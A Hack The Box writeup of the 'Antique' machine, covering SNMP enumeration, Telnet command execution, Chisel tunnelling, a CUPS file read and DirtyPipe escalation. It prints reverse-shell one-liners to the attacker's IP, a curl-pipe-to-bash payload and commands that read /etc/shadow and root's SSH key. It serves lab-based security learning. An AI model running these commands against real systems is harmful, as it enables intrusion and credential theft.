---
layout: post
title:  "Antique Writeup - Hack The Box"
date:   2023-12-19
desc: "SNMP Enumeration, Network Printer Abuse, CUPS Administration Exploitation, DirtyPipe"
keywords: "HTB,eJPT,Linux,SNMP,NetworkPrinterAbuse,CUPS,DirtyPipe,Medium"
categories: [HTB]
tags: [HTB,eJPT,Linux,SNMP,NetworkPrinterAbuse,CUPS,DirtyPipe,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

A new challenge begins, and the **Antique** box from [Hack The Box](https://www.hackthebox.com/){:target="_blank"} is a machine that allowed me to learn about some protocols such as **SNMP** or even read about the **[DirtyPipe Vulnerability](https://dirtypipe.cm4all.com/){:target="_blank"}** and learn about obtaining an **RCE** from a misconfiguration in a service, **TELNET**. The box is classified as **medium** and I think it is a good qualification due to the previous concepts that you must have, to recognize the attack vectors. There I go in search of new knowledge. 

<br/><br/>
<img src="{{ site.img_path }}/antique_writeup/Antique.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

If I deploy the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, I can confirm the OS it has installed thanks to the **Time to Live** (**TTL**) when sending a packet to the victim host. With `nmap` I start the reconnaissance phase, the machine only has the **Telnet** port open, of course, only those ports with **TCP** protocol are being checked. If I try to connect, it asks me for a password, which for the moment I do not have, brute force discarded, it is a technique not considered as good practice.

```bash
./htbExplorer -d Antique
```

> **HP JetDirect** print servers allow you to connect printers and other devices directly to a network. Connected directly to the network, devices can be conveniently located near users.

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.107 -oG allPorts

telnet 10.10.11.107
telnet 10.10.11.107 23
```
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If now with **nmap**, I search for open ports using **UDP** protocoll, it informs me that port **161** with the **SNMP** service is open. In **Linux** I have the `onesixtyone` tool to scan SNMP, but it performs an authentication method using a **Community String** dictionary, for this I can use one of the many provided by **[SecLists](https://github.com/danielmiessler/SecLists){:target="_blank"}**. But I don't succeed in decoding the packets, maybe the SNMP version is version 3 which uses encrypted data.

> **[SNMP](https://www.auvik.com/franklyit/blog/network-basics-what-is-snmp/){:target="_blank"}** stands for **Simple Network Management Protocol**, and it’s not your average protocol. It’s a powerful tool that facilitates the sharing of information among various devices on a network, regardless of their hardware or software.

> **Management Information Bases (MIBs)**: Each MIB consists of one or more nodes, which represent individual devices or device components on the network. In turn, each node has a unique **Object Identifier**, or **OID**. The OID for a given node is determined by the identifier of the MIB on which it exists combined with the node’s identifier within its MIB.

> **Community Strings**: As mentioned before, in order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3. The are 2 types of community strings: **public** mainly read only functions, **private** Read/Write in general.

```bash
nmap -sU --top-ports 100 -T5 --open -T5 -v -n 10.10.11.107 -oG allPortsUDP            # --> 161     SNMP
locate snmp | grep "txt" | grep -v "mibs-downloader"
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.11.107
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I turn to **[HackTricks (161,162,10161,10162/udp - Pentesting SNMP)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp){:target="_blank"}**, for advice on other ways to enumerate the **SNMP** service, it gives me all the information I need. I just need to install `snmp` in addition to `snmp-mibs-downloader`, and I can try to access the server traffic. But with none of the common **Community String** I get what I want, but I can look in the `snmpwalk` manual to see if I need to tweak any parameters to get better results (**[snmp cheatsheet](https://www.comparitech.com/net-admin/snmpwalk-examples-windows-linux/){:target="_blank"}**).

```bash
apt search --names-only snmp

apt install snmp
apt-get install snmp-mibs-downloader

nvim /etc/snmp/snmp.conf

snmpwalk -c public -v2c 10.10.11.107
snmpwalk -c oldboy -v2c 10.10.11.107
snmpwalk -c private -v2c 10.10.11.107

nmap --script "snmp* and not snmp-brute" 10.10.11.1

man snmpwalk
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I am not passing the **OID** to `snmpwalk`, it does not take the **root** into account, but if I pass it **1**, then it performs its task taking the **root** into account. Now if I succeed and find information. As the data is in hexadecimal format, I can use `xxd` and decode it, so I get a password that I can use in **Telnet**. The credentials are correct, and the service has an **exec** command that allows me to execute commands on the victim machine.

```bash
snmpwalk -c public -v2c 10.10.11.107 1        # (From de Root)

echo "50 40 73..... 134 135" | xxd -ps -r
telnet 10.10.11.107 23
  exec id
  exec whoami
  exec hostname
  exec ip a
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br>

Now it is time to access the box, I can find several commands using different binaries in the **[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}**. But they don't work for me, so I'm going to create a malicious `index.html` file, and then from the machine I'm going to load it with `curl` and interpret it with `bash` to get the **Reverse Shell**. When I get access I perform a console treatment for better mobility. I use some basic enumeration commands and I see that I belong to the **lpadmin** group, I don't know if it is relevant at the moment and I can also access the first flag. I also find the **Telnet** service configuration file, another advantage of practicing in the **Hack The Box** labs is to learn how the boxes are created.

> **Attacker Machine**:

```bash
nc -nlvp 443

telnet 10.10.11.107 23
  exec bash -i >& /dev/tcp/10.10.14.15/443 0>&1
```

> **index.html**

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.15/443 0>&1
```

```bash
nvim index.html
python3 -m http.server 80
nc -nlvp 443

telnet 10.10.11.107 23
  exec which curl
  exec curl 10.10.14.15|bash
```

> **Victime Machine**

```bash
script /dev/null -c bash        # :(

which python
which python3

python3 -c 'import pty;pty.spawn("/bin/sh")'      [CTRL^Z]
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

tty
bash

whoami
id
groups
hostname
hostname -I
ip a
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I continue listing the system, I find the **Codename**, the Version of the Operating System. I even find that the `pkexec` binary has **SUID** permissions, which could make it vulnerable to the exploit **[CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit){:target="_blank"}**, but I'm not going to use it for now, I'm going to look for another attack vector. I can also read the `passwd` backup file, but nothing interesting. I can't find **Cron tasks**, but if I list all the open ports, I find one that is only accessible from the victim host machine (**631**).

```bash
uname -a                        # 5.13.0
lsb_release -a                  # Ubuntu focal
sudo -l

find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l
# --> -rwsr-xr-x 1 root root /usr/bin/pkexec

getcap -r / 2>/dev/null

cat /etc/passwd
cat /etc/passwd-

netstat -nat
# --> 127.0.0.1:631
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to create a tunnel with **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}**, to be able to access from my machine to port **631**. If I download the whole Git project and then compile it to get the latest version of `chisel`, when I transfer it to the victim machine, it does not work. I try to download the executable binary, but it doesn't work either, everything makes me think that it is a version problem, I try with a **[previous version](https://github.com/jpillora/chisel/releases/tag/v1.7.6){:target="_blank"}** and now I can run `chisel` on the **Antique** box.

> **Attacker Machine**:

```bash
git clone https://github.com/jpillora/chisel
go build -ldflags "-s -w" .
upx chisel
du -hc chisel                 # 3.0M!!

python3 -m http.server 80
```

> **Victime Machine**:

```bash
cd /tmp
which wget
wget 10.10.14.15/chisel
chmod +x chisel

./chisel                  # :(
```

> **Attacker Machine**:

```bash
mv ~/Downloads/chisel_1.9.1_linux_amd64.gz chisel.gz
gunzip chisel.gz
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/chisel
chmod +x chisel

./chisel                  # :(
```

> **Attacker Machine**:

```bash
mv ~/Downloads/chisel_1.7.6_linux_amd64.gz chisel.gz
gunzip chisel.gz
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/chisel
chmod +x chisel

./chisel                  # :)
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I can create the tunnel and access the exposed web service on port **631**, which happens to be **CUPS**. If I search with `searchploit` some exploit that can help me to exploit some vulnerability for version **1.6.1**, I find some scripts, but after analyzing them I don't think they will help me. But if I search the internet I find a project on Github, which develops a module for **Metasploit** that allows privilege escalation, **[cups_root_file_read.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb){:target="_blank"}**. I will not automate the attack but I can analyze the code to understand roughly how it exploits the vulnerability **[CVE-2012-5519](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2012-5519){:target="_blank"}** to perform the attack.
> **Attacker Machine**:

```bash
./chisel server -reverse -p 1234
```

> **Victime Machine**:

```bash
./chisel client 10.10.14.29:1234 R:631:127.0.0.1:631      # :(
./chisel client 10.10.14.29:1234 R:1631:127.0.0.1:631
```

> **CUPS** is the standards-based, open source printing system developed by Apple Inc. for OS X and other UNIX-like operating systems.

> **Attacker Machine**:

```bash
lsof -i:631

searchsploit CUPS 1.6.1
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

It is only necessary to analyze a little the script, to have a panoramic of what it is carrying out, there is a call to a function `cmd_exec`, to which it passes a variable, that has as value the absolute path of the binary `cupsctl`. Then this binary is executed passing it in the parameter `ErrorLog` the private file that we want to read. I can also observe the path to the `error_log` log from the browser (**'/var/log/cups/error_log'*). All this possible, thanks to the vunlerability and also because we belong to the **lpadmin** group, now I begin to join the loose ends that one is leaving in the enumeration phase. I can now read all the sensitive files on the system, even the `root` flag.

> The **`cupsctl`** program is used to manage the printing system as a whole, including things like debug logging and printer sharing. The **CUPS web interface** ("http://localhost:631" or "https://servername:631") can also be used, and most operating systems provide their own GUI administration tools.

```bash
which cupsctl
# --> /usr/sbin/cupsctl

curl http://127.0.0.1:631/admin/log/error_log                           # Emtpy. Nothing!!

cupsctl ErrorLog=/etc/passwd
curl http://127.0.0.1:631/admin/log/error_log 

cupsctl ErrorLog=/etc/shadow
curl http://127.0.0.1:631/admin/log/error_log

cupsctl ErrorLog=/root/.ssh/id_rsa
curl http://127.0.0.1:631/admin/log/error_log

cupsctl ErrolLog=/root/root.txt
curl http://127.0.0.1:631/admin/log/error_log 
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I have not been able to access the machine as the `root` user, I am going to take advantage of the exploit **[CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit){:target="_blank"}** and change the `root` user password and migrate user. I only have to create and compile with `gcc` the exploit in the victim machine, after executing it I can **pwned* the box.

```bash
which gcc
nano exploit.c
gcc exploit.c -o privesc
./privesc

su root
```

<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/antique_writeup/Antique_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> What a great **Hack The Box**, there is always some new concept that I learn and it takes me hours, then research and read to understand the vulnerability that is being exploited, of course I **don't understand 100%** of things, but I am left with a clearer picture of the whole process. It's time to kill the box with **htbExplorer** and go for the next machine.

```bash
./htbExplorer -k Antique
```
